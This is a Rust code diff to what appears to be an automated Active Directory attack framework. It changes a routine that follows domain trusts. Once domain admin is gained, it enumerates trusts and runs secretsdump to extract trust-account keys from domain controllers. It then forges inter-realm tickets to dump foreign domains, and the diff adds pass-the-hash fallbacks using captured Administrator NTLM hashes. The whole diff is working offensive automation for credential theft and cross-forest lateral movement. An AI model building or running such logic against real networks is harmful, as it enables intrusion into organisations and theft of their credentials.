@@ -38,47 +38,92 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         {
             let state = dispatcher.state.read().await;
             if state.has_domain_admin {
-                // Dispatch trust enumeration for each known DC (once per domain)
+                // Dispatch trust enumeration for each known DC.
+                // Two dedup keys per domain:
+                //   trust_enum:<domain> — password-based attempt
+                //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
                 let enum_work: Vec<(String, String, String)> = state
                     .domain_controllers
                     .iter()
                     .filter(|(domain, _)| {
                         let key = format!("trust_enum:{}", domain.to_lowercase());
+                        let hash_key = format!("trust_enum_hash:{}", domain.to_lowercase());
                         !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
+                            || (!state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key)
+                                && state.dominated_domains.contains(&domain.to_lowercase()))
                     })
                     .map(|(domain, dc_ip)| {
-                        let key = format!("trust_enum:{}", domain.to_lowercase());
+                        // Use hash_key if password-based was already tried
+                        let pw_key = format!("trust_enum:{}", domain.to_lowercase());
+                        let key = if state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key) {
+                            format!("trust_enum_hash:{}", domain.to_lowercase())
+                        } else {
+                            pw_key
+                        };
                         (key, domain.clone(), dc_ip.clone())
                     })
                     .collect();
                 drop(state);
 
                 for (key, domain, dc_ip) in enum_work {
-                    // Find a credential for this domain
-                    let cred = {
+                    // Find a credential for this domain — prefer password creds,
+                    // fall back to admin NTLM hash for hash-based LDAP auth.
+                    let (cred_payload, auth_method) = {
                         let s = dispatcher.state.read().await;
-                        s.credentials
+                        let dd = domain.to_lowercase();
+
+                        // First try: password credential (exact or child↔parent match)
+                        let pw_cred = s
+                            .credentials
                             .iter()
                             .find(|c| {
-                                !c.password.is_empty()
-                                    && (c.domain.to_lowercase() == domain.to_lowercase()
-                                        || domain
-                                            .to_lowercase()
-                                            .ends_with(&format!(".{}", c.domain.to_lowercase())))
+                                if c.password.is_empty() {
+                                    return false;
+                                }
+                                let cd = c.domain.to_lowercase();
+                                cd == dd
+                                    || cd.ends_with(&format!(".{}", dd))
+                                    || dd.ends_with(&format!(".{}", cd))
                             })
-                            .cloned()
+                            .cloned();
+
+                        if let Some(cred) = pw_cred {
+                            (
+                                Some(json!({
+                                    "username": cred.username,
+                                    "password": cred.password,
+                                    "domain": cred.domain,
+                                })),
+                                "password",
+                            )
+                        } else {
+                            // Fallback: find an admin NTLM hash for this exact domain
+                            let admin_hash = s.hashes.iter().find(|h| {
+                                h.hash_type == "ntlm"
+                                    && h.domain.to_lowercase() == dd
+                                    && h.username.to_lowercase() == "administrator"
+                            });
+                            if let Some(h) = admin_hash {
+                                (
+                                    Some(json!({
+                                        "username": "Administrator",
+                                        "hash": h.hash_value.clone(),
+                                        "domain": domain,
+                                    })),
+                                    "hash",
+                                )
+                            } else {
+                                (None, "none")
+                            }
+                        }
                     };
 
-                    if let Some(cred) = cred {
+                    if let Some(cred_json) = cred_payload {
                         let payload = json!({
                             "techniques": ["enumerate_domain_trusts"],
                             "target_ip": dc_ip,
                             "domain": domain,
-                            "credential": {
-                                "username": cred.username,
-                                "password": cred.password,
-                                "domain": cred.domain,
-                            },
+                            "credential": cred_json,
                         });
 
                         match dispatcher
@@ -89,6 +134,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 info!(
                                     task_id = %task_id,
                                     domain = %domain,
+                                    auth = auth_method,
                                     "Trust enumeration dispatched"
                                 );
                                 dispatcher
@@ -113,7 +159,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         {
             let state = dispatcher.state.read().await;
             if state.has_domain_admin && !state.trusted_domains.is_empty() {
-                let extract_work: Vec<(String, String, String, String)> = state
+                // Collect trust work with per-trust source domain:
+                // use a dominated domain that has a known DC (excluding the trust target).
+                let extract_work: Vec<(String, String, String, String, String)> = state
                     .trusted_domains
                     .values()
                     .filter(|trust| trust.is_cross_forest())
@@ -122,16 +170,25 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                             return None;
                         }
-                        // Find a DC in the source domain (our domain, not the trust target)
-                        // The trust domain is the foreign one; we need to secretsdump our DC
-                        let source_domain = state.domains.first()?;
-                        let dc_ip = state
+                        // Find a DC in a dominated source domain (not the foreign trust target)
+                        let (source_domain, dc_ip) = state
                             .domain_controllers
-                            .get(&source_domain.to_lowercase())
-                            .cloned()?;
-                        Some((key, trust.flat_name.clone(), trust.domain.clone(), dc_ip))
+                            .iter()
+                            .find(|(domain, _)| {
+                                domain.to_lowercase() != trust.domain.to_lowercase()
+                                    && state.dominated_domains.contains(&domain.to_lowercase())
+                            })
+                            .map(|(d, ip)| (d.clone(), ip.clone()))?;
+                        Some((
+                            key,
+                            trust.flat_name.clone(),
+                            trust.domain.clone(),
+                            dc_ip,
+                            source_domain,
+                        ))
                     })
                     .collect();
+                // Prefer plaintext admin credential (domain-agnostic; refined per-trust below).
                 let admin_cred = state
                     .credentials
                     .iter()
@@ -139,48 +196,98 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     .cloned();
                 drop(state);
 
-                if let Some(cred) = admin_cred {
-                    for (key, flat_name, trust_domain, dc_ip) in extract_work {
-                        // secretsdump -just-dc-user FABRIKAM$ to get trust key
-                        let trust_account = format!("{}$", flat_name.to_uppercase());
-                        let payload = json!({
-                            "technique": "secretsdump",
-                            "target_ip": dc_ip,
-                            "domain": cred.domain,
-                            "just_dc_user": trust_account,
-                            "credential": {
+                for (key, flat_name, trust_domain, dc_ip, source_domain) in extract_work {
+                    // Find admin hash specifically for this trust's source domain.
+                    // DA is typically achieved via hash-based attacks like secretsdump,
+                    // so admin creds often only exist as hashes, not plaintext passwords.
+                    let admin_hash = if admin_cred.is_none() {
+                        let s = dispatcher.state.read().await;
+                        s.hashes
+                            .iter()
+                            .find(|h| {
+                                h.username.to_lowercase() == "administrator"
+                                    && h.domain.to_lowercase() == source_domain.to_lowercase()
+                                    && h.hash_type.to_uppercase() == "NTLM"
+                            })
+                            .cloned()
+                    } else {
+                        None
+                    };
+
+                    // Build credential payload from either plaintext cred or NTLM hash
+                    let cred_payload: Option<(String, String, serde_json::Value)> = if let Some(
+                        ref cred,
+                    ) =
+                        admin_cred
+                    {
+                        Some((
+                            cred.username.clone(),
+                            cred.domain.clone(),
+                            json!({
                                 "username": cred.username,
                                 "password": cred.password,
                                 "domain": cred.domain,
-                            },
-                            "reason": format!("extract trust key for {}", trust_domain),
-                        });
+                            }),
+                        ))
+                    } else if let Some(ref hash) = admin_hash {
+                        Some((
+                            hash.username.clone(),
+                            source_domain.clone(),
+                            json!({
+                                "username": hash.username,
+                                "domain": source_domain,
+                            }),
+                        ))
+                    } else {
+                        debug!(
+                            trust_domain = %trust_domain,
+                            source_domain = %source_domain,
+                            "No admin cred/hash for source domain — deferring trust key extraction"
+                        );
+                        continue;
+                    };
 
-                        match dispatcher
-                            .throttled_submit("credential_access", "credential_access", payload, 2)
-                            .await
-                        {
-                            Ok(Some(task_id)) => {
-                                info!(
-                                    task_id = %task_id,
-                                    trust_account = %trust_account,
-                                    trust_domain = %trust_domain,
-                                    "Trust key extraction dispatched"
-                                );
-                                dispatcher
-                                    .state
-                                    .write()
-                                    .await
-                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
-                                let _ = dispatcher
-                                    .state
-                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
-                                    .await;
-                            }
-                            Ok(None) => {}
-                            Err(e) => {
-                                warn!(err = %e, "Failed to dispatch trust key extraction")
-                            }
+                    let (_, domain, cred_json) = cred_payload.unwrap();
+                    // secretsdump -just-dc-user FABRIKAM$ to get trust key
+                    let trust_account = format!("{}$", flat_name.to_uppercase());
+                    let mut payload = json!({
+                        "technique": "secretsdump",
+                        "target_ip": dc_ip,
+                        "domain": domain,
+                        "just_dc_user": trust_account,
+                        "credential": cred_json,
+                        "reason": format!("extract trust key for {}", trust_domain),
+                    });
+                    if let Some(ref hash) = admin_hash {
+                        payload["hash_value"] = json!(hash.hash_value);
+                    }
+
+                    match dispatcher
+                        .throttled_submit("credential_access", "credential_access", payload, 2)
+                        .await
+                    {
+                        Ok(Some(task_id)) => {
+                            info!(
+                                task_id = %task_id,
+                                trust_account = %trust_account,
+                                trust_domain = %trust_domain,
+                                source_domain = %source_domain,
+                                auth = if admin_cred.is_some() { "password" } else { "hash" },
+                                "Trust key extraction dispatched"
+                            );
+                            dispatcher
+                                .state
+                                .write()
+                                .await
+                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                            let _ = dispatcher
+                                .state
+                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                                .await;
+                        }
+                        Ok(None) => {}
+                        Err(e) => {
+                            warn!(err = %e, "Failed to dispatch trust key extraction")
                         }
                     }
                 }
@@ -188,9 +295,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         }
 
         // Follow trust keys (inter-realm ticket + foreign secretsdump)
-        let (work, admin_cred_phase3): (
+        let (work, admin_cred_phase3, admin_hash_phase3): (
             Vec<TrustFollowWork>,
             Option<ares_core::models::Credential>,
+            Option<ares_core::models::Hash>,
         ) = {
             let state = dispatcher.state.read().await;
 
@@ -213,6 +321,23 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 .iter()
                 .find(|c| c.is_admin && !c.password.is_empty())
                 .cloned();
+            // Find admin hash from any dominated domain with a DC
+            let admin_hash = if admin_cred.is_none() {
+                state
+                    .domain_controllers
+                    .keys()
+                    .filter(|d| state.dominated_domains.contains(&d.to_lowercase()))
+                    .find_map(|dom| {
+                        state.hashes.iter().find(|h| {
+                            h.username.to_lowercase() == "administrator"
+                                && h.domain.to_lowercase() == dom.to_lowercase()
+                                && h.hash_type.to_uppercase() == "NTLM"
+                        })
+                    })
+                    .cloned()
+            } else {
+                None
+            };
 
             let items = state
                 .hashes
@@ -226,10 +351,15 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     let netbios = hash.username.trim_end_matches('$').to_uppercase();
                     let trust = trust_by_flat.get(&netbios)?;
 
-                    // Resolve source domain — fall back to first known domain
-                    // when secretsdump output lacks domain prefix for machine accounts
+                    // Resolve source domain — fall back to first dominated domain
+                    // with a DC when secretsdump output lacks domain prefix
                     let source_domain = if hash.domain.is_empty() {
-                        state.domains.first().cloned().unwrap_or_default()
+                        state
+                            .domain_controllers
+                            .keys()
+                            .find(|d| state.dominated_domains.contains(&d.to_lowercase()))
+                            .cloned()
+                            .unwrap_or_default()
                     } else {
                         hash.domain.clone()
                     };
@@ -282,7 +412,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 })
                 .collect();
 
-            (items, admin_cred)
+            (items, admin_cred, admin_hash)
         };
 
         for item in work {
@@ -364,6 +494,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             if let Some(ref cred) = admin_cred_phase3 {
                 ticket_payload["username"] = json!(cred.username);
                 ticket_payload["password"] = json!(cred.password);
+            } else if let Some(ref hash) = admin_hash_phase3 {
+                ticket_payload["username"] = json!(hash.username);
+                ticket_payload["admin_hash"] = json!(hash.hash_value);
             }
 
             match dispatcher
